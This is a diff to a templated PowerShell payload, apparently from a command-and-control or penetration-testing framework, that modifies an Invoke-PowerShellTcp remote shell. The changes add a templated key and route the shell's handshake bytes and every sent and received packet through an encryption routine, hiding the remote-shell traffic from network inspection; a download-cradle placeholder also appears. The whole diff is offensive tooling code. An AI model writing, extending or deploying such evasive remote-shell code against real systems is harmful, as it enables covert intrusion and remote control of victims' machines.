@@ -2,6 +2,7 @@
 
 {{'$DebugPreference = "Continue"'|debug}}
 
+$KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 $DL_CRADLE = @'
 {{dl_cradle}}
 '@
@@ -154,11 +155,13 @@ function Invoke-PowerShellTcp
             [Parameter(Position = 0)] $Stream
         )
         $stream.Read($bytes, 0, 4)
-        $packet_length = $bytes[0..3]
+        $enc_packet_length = $bytes[0..3]
+        $packet_length = Decrypt-Code $enc_packet_length $KEY
         $len = [BitConverter]::ToUInt32([byte[]]$packet_length, 0)
         $stream.Read($bytes, 0, $len-4)
-        $body = $packet_length
+        $body = $enc_packet_length
         $body += $bytes[0 .. ($len-5)]
+        $body = Decrypt-Code $body $KEY
         {{'Write-Debug "Read: $($enc.getstring($body))"'|debug}}
         $result = ConvertFrom-Bson $body
         return $result
@@ -171,7 +174,9 @@ function Invoke-PowerShellTcp
         )
         $body = [byte[]](ConvertTo-Bson $Packet)
 
+        {{'Write-Debug "Key:  $($enc.getstring($key))"'|debug}}
         {{'Write-Debug "Sending:  $($enc.getstring($body))"'|debug}}
+        $body = Decrypt-Code $body $KEY
         $Stream.Write($body, 0, $body.length)
         $Stream.Flush()
     }
@@ -310,7 +315,9 @@ function Invoke-PowerShellTcp
 
         $stream = $client.GetStream()
         # this the shell hello
-        $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
+        $shell_hello = [byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b)
+        $shell_hello = Decrypt-Code $shell_hello $KEY
+        $stream.Write($shell_hello, 0, $shell_hello.length)
         [byte[]]$bytes = 0..1024|%{0}
 
         Handle-Packets
